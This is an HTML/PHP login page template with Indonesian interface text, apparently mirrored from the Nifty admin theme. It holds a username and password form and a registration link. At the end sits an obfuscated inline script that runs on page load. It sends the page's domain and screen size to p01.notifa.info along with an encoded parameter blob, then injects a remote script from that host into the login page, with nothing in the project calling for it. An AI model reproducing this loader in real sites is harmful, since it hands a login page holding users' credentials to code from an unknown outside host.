<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.themeon.net/nifty/v2.9.1/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:04:56 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Halaman Login</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>



    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">


    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    ==============================f===================-->

</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->

<body>
    <div id="container" class="cls-container">

		<!-- BACKGROUND IMAGE -->
		<!--===================================================-->
		<div id="bg-overlay"></div>


		<!-- LOGIN FORM -->
		<!--===================================================-->

		<div class="cls-content">
		    <div class="cls-content-sm panel">
		        <div class="panel panel-body">
		            <div class="mar-ver pad-btm">
		                <h1 class="h3">Account Login</h1>
		            </div>
		                <form action="<?php echo base_url('login/proses_login' ) ?>" method="POST">
		                <div class="form-group">
		                    <input type="text" name="username" class="form-control" placeholder="Username" autofocus>
		                </div>
		                <div class="form-group">
		                    <input type="password" name="password" class="form-control" placeholder="Password">
		                </div>

		               <button class="btn btn-primary btn-lg btn-block" type="submit">Login</button>
		            </form>
                    <div class="pad-all">
                    <!-- Belum Punya Akun?<a href="<?php echo base_url('login/registerAdmin')?>" class="btn-link mar-rgt text-bold">Daftar</a></br> -->
                    Belum Punya Akun?<a href="<?php echo base_url('login/registerUser')?>" class="btn-link mar-rgt text-bold">Daftar</a>
                </div>
		        </div>
		    </div>
		</div>

		<!--===================================================-->


		<!-- DEMO PURPOSE ONLY -->
		<!--===================================================-->

		<!--===================================================-->



    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->



    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Background Image [ DEMONSTRATION ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/bg-images.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjVYPvz8EvePryz3GltSPqJqzP4k29vAJGrcx%2b1VDBSUzTKYG1hjDGT3F5dOY6ytyaZGaP6nn7W9JqxudB9W6uwgGMw%2bb12Bbvh3wmHozassvvjOqqXFJpcisCgJtFBtcmn%2bJWy6lRL0igwjf4S2yoYTzqQb77iw1TaoDSLkmSEbtc0eRuAePv%2fPYA83JbXMTTf1ONss158fFCBm32iFxaa5b7c4WYhyYk1Qb9BqcKaFr9YKXjVq42pFrQ5jUrhvAHvcBjDHecoomO6Q97gHetEOOM2WTvZBzm%2bZ%2f98LSMpw7duEHNlsZpdypB9iyq0hm6%2fQxnlT4ipR7GX%2bM1zfrw0oKbnRptGo3TpzrArqVQ4ACI2IYOXXxSCsghMvP9%2ffwJLiXHSq%2fZ9D2of9akRiM6F%2b83l7zNQgcd%2bEDu7k6LjihtoMjJsHjPHGjHJl9Lj2BqnSqLWNfvwlP3EiOWXy359mwhie%2bRauf0wbfOS%2fYMIKEg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:05:02 GMT -->
</html>
